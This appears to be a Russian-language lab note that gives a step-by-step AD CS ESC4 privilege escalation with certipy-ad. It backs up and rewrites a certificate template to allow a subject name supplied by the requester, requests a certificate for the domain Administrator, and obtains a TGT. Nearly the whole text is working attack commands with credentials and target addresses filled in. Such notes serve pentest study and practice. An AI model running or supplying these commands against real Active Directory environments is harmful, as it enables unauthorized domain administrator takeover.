# ESC4


Для начала нужно выставить флаг (чтобы получилось выполнит ESC1)

(для отката шаблона)
certipy-ad template -u 'test@work.local' -p 'Qpr1al9te!' -dc-ip 192.168.0.10 -template 'ESC4' -write-configuration ESC4.json -force

1) Сохраняем текущую конфигурацию шаблона в файл (бэкап)
certipy-ad template -u 'test@work.local' -p 'Qpr1al9te!' -dc-ip 192.168.0.10 -template 'ESC4' -save-configuration esc4_backup.json

2) Редактируем сохраненный файл
Нужно поставить 1 для msPKI-Certificate-Name-Flag ("msPKI-Certificate-Name-Flag": 1,)

3) Применяем измененную конфигурацию обратно в AD

certipy-ad template -u 'test@work.local' -p 'Qpr1al9te!' -dc-ip 192.168.0.10 -template 'ESC4' -write-configuration esc4_backup.json

4) Запрашиваем серт для админа
certipy-ad req -u 'test@work.local' -p 'Qpr1al9te!' -dc-ip 192.168.0.10 -ca 'work-DC01-CA' -template 'ESC4' -upn 'Администратор@work.local'

5) Получаем TGT
certipy-ad auth -pfx 'test.pfx' -dc-ip 192.168.0.10



certipy-ad template -u 'test@work.local' -p 'Qpr1al9te!' -dc-ip 192.168.0.10 -template 'ESC1' -save-configuration ESC1.json